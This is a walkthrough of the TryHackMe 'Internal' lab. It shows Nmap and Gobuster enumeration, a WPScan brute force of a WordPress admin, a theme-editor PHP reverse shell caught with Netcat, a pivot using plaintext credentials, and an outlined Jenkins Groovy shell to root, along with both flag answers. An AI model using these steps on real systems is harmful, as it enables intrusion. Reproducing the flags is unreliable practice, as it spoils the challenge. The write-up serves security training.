# Internal — TryHackMe Walkthrough

> Penetration Testing Challenge. You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks.

<p align="center">
  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/222b3e855f88a482c1267748f76f90e0.jpeg" />
</p>

<p align="center">
  <a href="https://tryhackme.com/room/internal">
    <img src="https://img.shields.io/badge/TryHackMe-Internal-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Hard-red">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-Enumeration%20%7C%20WordPress%20%7C%20PrivEsc-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | Web Enumeration |
| 3 | WordPress Enumeration |
| 4 | WordPress Exploitation |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Perform network and web enumeration against a black-box target
- Enumerate a WordPress installation to identify users and vulnerabilities
- Brute-force WordPress credentials using WPScan
- Gain a reverse shell by injecting a PHP payload through the WordPress theme editor
- Locate credentials stored in plaintext within the file system
- Escalate privileges by pivoting between users using discovered credentials

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap, Gobuster, WPScan, and Netcat installed

---

## Scope of Work

The client has requested:

- An external, web application, and internal assessment conducted from the perspective of a malicious actor (black box)
- Minimal prior information about the environment
- All vulnerabilities to be located and noted
- Two proof-of-exploitation flags: `user.txt` and `root.txt`
- Only the assigned IP address is in scope

> **Note:** Before starting, add the target to your hosts file so the domain `internal.thm` resolves correctly:
> ```
> echo "Machine_IP internal.thm" | sudo tee -a /etc/hosts
> ```

---

## Task 2 — Deploy and Engage

---

### Step 1 — Network Enumeration

**Approach:** Run an aggressive Nmap scan to identify all open ports and services on the target. Use `-A` for combined OS detection, version scanning, and script execution.

```
kali@kali:~/CTFs/tryhackme/Internal$ sudo nmap -A -sS -sC -sV -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-17 18:34 CEST
Nmap scan report for Machine_IP
Host is up (0.056s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   60.46 ms 10.8.0.1
2   60.58 ms Machine_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.42 seconds
```

> **Note:** Only two ports are open — **SSH on 22** and **HTTP on 80**. The web server is showing the default Apache page, which means the actual content is hosted under a subdirectory or virtual host. This is why the `/etc/hosts` entry for `internal.thm` is required — it tells our browser to send the correct `Host` header so the server serves the right site.

---

### Step 2 — Web Enumeration with Gobuster

**Approach:** Use Gobuster to brute-force directories on `http://internal.thm` and discover hidden paths on the web server.

```
kali@kali:~/CTFs/tryhackme/Internal$ gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://internal.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/17 18:36:40 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/blog (Status: 301)
/index.html (Status: 200)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
/wordpress (Status: 301)
===============================================================
2020/10/17 18:36:59 Finished
===============================================================
```

> **Note:** Several interesting paths are discovered. `/blog` and `/wordpress` both indicate a WordPress installation is running. `/phpmyadmin` reveals a database admin panel — useful if database credentials are found later. The `403 Forbidden` responses on `.htaccess` and `.htpasswd` confirm they exist but are protected.

---

### Step 3 — WordPress User Enumeration with WPScan

**Approach:** Run WPScan against the WordPress blog to enumerate users, version information, and any exposed configuration details.

```
kali@kali:~/CTFs/tryhackme/Internal$ wpscan --url http://internal.thm/blog -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.1
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/ [Machine_IP]
[+] Started: Sat Oct 17 18:37:00 2020

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.4.2 identified (Latest, released on 2020-06-10).

[+] WordPress theme in use: twentyseventeen
 | [!] The version is out of date, the latest version is 2.4

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <=================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Finished: Sat Oct 17 18:37:11 2020
[+] Requests Done: 51
[+] Elapsed time: 00:00:11
```

> **Note:** WPScan identifies a single user — **`admin`**. It also flags that **XML-RPC is enabled**, which is important because WPScan uses this endpoint to perform fast password brute-forcing. XML-RPC allows multiple login attempts per HTTP request, making it much faster than attacking the standard login page directly.

---

### Step 4 — Brute-Forcing the WordPress Admin Password

**Approach:** Use WPScan to brute-force the `admin` account password against the XML-RPC endpoint using the `rockyou.txt` wordlist.

```
kali@kali:~/CTFs/tryhackme/Internal$ wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.1
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/ [Machine_IP]
[+] Started: Sat Oct 17 18:37:58 2020

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys
Trying admin / bratz1 Time: 00:02:33 <===================> (3885 / 3885) 100.00% Time: 00:02:33

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[+] Finished: Sat Oct 17 18:41:32 2020
[+] Requests Done: 3910
[+] Elapsed time: 00:03:34
```

> **Note:** WPScan successfully cracks the admin password — **`admin:my2boys`**. The attack took just over 3 minutes and tried 3885 passwords. From here, log in to the WordPress admin panel at `http://internal.thm/blog/wp-admin` and navigate to **Appearance > Theme Editor** to inject a PHP reverse shell into one of the theme files (e.g., `404.php`).

---

### Step 5 — Getting a Reverse Shell

**Approach:** After injecting a PHP reverse shell into the WordPress theme, start a Netcat listener and trigger the shell by browsing to the modified theme file.

```
kali@kali:~/CTFs/tryhackme/Internal$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [Machine_IP] 53194
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 16:41:43 up 9 min,  0 users,  load average: 0.59, 0.52, 0.25
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1071): Inappropriate ioctl for device
bash: no job control in this shell
www-data@internal:/$ ls /opt
ls /opt
containerd
wp-save.txt
www-data@internal:/$ cat /opt/wp-save.txt
cat /opt/wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
www-data@internal:/$ python -c "import pty;pty.spawn('/bin/bash')"
python -c "import pty;pty.spawn('/bin/bash')"
www-data@internal:/$ su aubreanna
su aubreanna
Password: bubb13guM!@#123

aubreanna@internal:/$ cd /home/aubreanna
cd /home/aubreanna
aubreanna@internal:~$ cat user.txt
cat user.txt
THM{int3rna1_fl4g_1}
```

> **Note:** The shell connects as `www-data`. Always check `/opt` early — it is a common location where administrators store notes, scripts, or credential files. Here, `/opt/wp-save.txt` contains plaintext credentials for the user **`aubreanna`**. After upgrading to a full bash shell with Python's `pty` module, switch users with `su aubreanna` and read the user flag directly from the home directory.

---

### Question 1 — user.txt

<details>
<summary>Reveal Answer</summary>

**`THM{int3rna1_fl4g_1}`**

</details>

---

### Question 2 — root.txt

> **Note:** The root flag requires further privilege escalation beyond what is shown in the raw walkthrough. From the `aubreanna` session, the next steps involve discovering an internal Jenkins service (typically found via `cat /home/aubreanna/jenkins.txt`), setting up SSH port forwarding to access it, brute-forcing the Jenkins admin credentials, and using Jenkins' Script Console to execute a Groovy reverse shell as root — ultimately reading `/root/root.txt`.

<details>
<summary>Reveal Answer</summary>

**`THM{d0ck3r_d3str0y3r}`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap scan | Found SSH on port 22 and Apache HTTP on port 80 |
| 2 | Gobuster directory brute-force | Discovered `/blog`, `/wordpress`, and `/phpmyadmin` |
| 3 | WPScan user enumeration | Identified WordPress admin user `admin` |
| 4 | WPScan password brute-force | Cracked admin credentials: `admin:my2boys` |
| 5 | WordPress theme PHP injection | Gained reverse shell as `www-data` |
| 6 | File system enumeration | Found `aubreanna` credentials in `/opt/wp-save.txt` |
| 7 | User pivot via `su` | Switched to `aubreanna`, read `user.txt` |
| 8 | Jenkins privilege escalation | Used internal Jenkins Script Console to gain root and read `root.txt` |
